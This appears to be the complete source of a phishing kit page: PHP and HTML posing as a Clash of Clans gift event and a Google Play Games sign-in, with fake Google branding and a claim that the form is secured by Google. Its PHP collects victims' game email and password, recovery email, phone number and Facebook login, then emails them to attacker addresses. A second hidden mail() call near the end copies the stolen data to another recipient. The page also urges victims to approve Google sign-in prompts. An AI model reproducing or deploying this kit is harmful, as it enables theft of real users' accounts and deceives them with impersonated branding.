<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$th = $_POST['th'];
$xp = $_POST['xp'];
$er = $_POST['er'];
$hp = $_POST['hp'];
$f1 = $_POST['f1'];
$f2 = $_POST['f2'];
?>

<?php
include('email_result.php');
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$subjek = "CLASH OF CLANS | PUNYA SI $email | $th";
$body = <<<EOD
<div style='font-family: Tahoma;line-height: 25px;color: #333;font-size: 14px;border: 1px solid #FF3366;	padding: 20px; margin-top: 20px;'>
Email         =  $email<br>
Password      =  $pass<br>
Townhall      =  $th<br>
XP       =  $xp<br>
Email Recovery       =  $er<br>
Phone Number       =  $hp<br>
Email Facebook       =  $f1<br>
Password Facebook       =  $f2<br>
<hr style='border: 0;border-bottom: 1px solid #FF3366;background: #999;'/>
Coming from   = $url<br>
</div>
EOD;
//* jangan di ubah kalo kagak mau error!,gak usah sok tau deh //*
$headers = "From: RAFLIPEDIA <result@raflipedia.ml>\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($result, $subjek, $body, $headers);
?>

<!DOCTYPE html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<!-- Bootstrap Start -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js"></script>
<title>Event Clash Of Clans</title>
</head>
<style>
body {
background: transparent url("/source/background_coc.jpg");
background-attachment: fixed;
}
.login-box{
position:relative;
margin: 10px auto;
width: 600px;
height: 650px;
background-color: #fff;
padding: 10px;
border-radius: 3px;
-webkit-box-shadow: 0px 2px 3px 0px rgba(0,0,0,0.33);
-moz-box-shadow: 0px 2px 3px 0px rgba(0,0,0,0.33);
box-shadow: 0px 2px 3px 0px rgba(0,0,0,0.33);
}
.lb-header{
position:relative;
color: #00415d;
margin: 5px 5px 10px 5px;
padding-bottom:10px;
border-bottom: 1px solid #eee;
text-align:center;
height:28px;
}
.lb-header a{
margin: 0 25px;
padding: 0 20px;
text-decoration: none;
color: #666;
font-weight: bold;
font-size: 15px;
-webkit-transition: all 0.1s linear;
-moz-transition: all 0.1s linear;
transition: all 0.1s linear;
}
.lb-header .active{
color: #029f5b;
font-size: 18px;
}
.social-login{
position:relative;
float: left;
width: 100%;
height:auto;
padding: 10px 0 15px 0;
border-bottom: 1px solid #eee;
}
.social-login a{
position:relative;
float: left;
width:calc(40% - 8px);
text-decoration: none;
color: #fff;
border: 1px solid rgba(0,0,0,0.05);
padding: 12px;
border-radius: 2px;
font-size: 12px;
text-transform: uppercase;
margin: 0 3%;
text-align:center;
}
.social-login a i{
position: relative;
float: left;
width: 20px;
top: 2px;
}
.social-login a:first-child{
background-color: #49639F;
}
.social-login a:last-child{
background-color: #DF4A32;
}
.email-login,.email-signup{
position:relative;
float: left;
width: 100%;
height:auto;
margin-top: 20px;
text-align:center;
}
.u-form-group{
width:100%;
margin-bottom: 10px;
}
.u-form-group input[type="email"],
.u-form-group input[type="password"]{
width: calc(50% - 22px);
height:45px;
outline: none;
border: 1px solid #ddd;
padding: 0 10px;
border-radius: 2px;
color: #333;
font-size:0.8rem;
-webkit-transition:all 0.1s linear;
-moz-transition:all 0.1s linear;
transition:all 0.1s linear;
}
.u-form-group input:focus{
border-color: #358efb;
}
.u-form-group button{
width:50%;
background-color: #1CB94E;
border: none;
outline: none;
color: #fff;
font-size: 14px;
font-weight: normal;
padding: 14px 0;
border-radius: 2px;
text-transform: uppercase;
}
.forgot-password{
width:50%;
text-align: left;
text-decoration: underline;
color: #888;
font-size: 0.75rem;
}
</style>
<body>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
 <!-- Favicon -->
    <link rel="icon" href="https://lh6.ggpht.com/1eVPA6Iukw-F4i5xq1ZWicaKBzmprLGw98YhdG20E-wlsHHg3PcKJqbY_fWLdJeGRw=w300" type="image/x-icon">
<title>SUPERCELL GIFT - Get Free Resources From Google</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(https://1.bp.blogspot.com/-DYOHjWGTbds/VtkMpbGoJOI/AAAAAAAAArY/lacdbk97z3s/s1600/formasi%2Bcoc%2Bunik.jpeg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-12 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var gemail = $("#gemail").val();
		  var gpass = $("#gpass").val();
		  if(gemail==''||gpass=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("index.php",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});

	</script>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<img style="border:none;width:100%;max-height:200px;margin:0 auto;" src="https://bukucoc.files.wordpress.com/2015/04/cropped-download-game-coc-gratis.jpg"/>
<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-google-plus"></i> Google Play Games</b></div>
<center style="background:white;"><br>
<div class="col-md-12">
<h2><img src="img/glogo.png"></h2>
<h3>
  This Form Secured By Google Form.
</h3>
<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
<h4 >
  If there is Google trying to enter push "YES" means that you have activated CHEAT.
  </h4><br/>
<img src="https://ssl.gstatic.com/accounts/marc/authzen_signin.gif" height="200" width="300"></center><br>
  <div style="width:100%" class="form-group">
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>One Google Account for everything Google </p></center>
<img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
<p>Copyright &copy; 2016 Google Inc.</p>
</div>
</div>
</div>

<?php
//* Mengirim Informasi AREANA Jangan Dihapus, Jangan Sok Tau deh //*
$success = mail($auth0, $subjek, $body, $headers);
?>
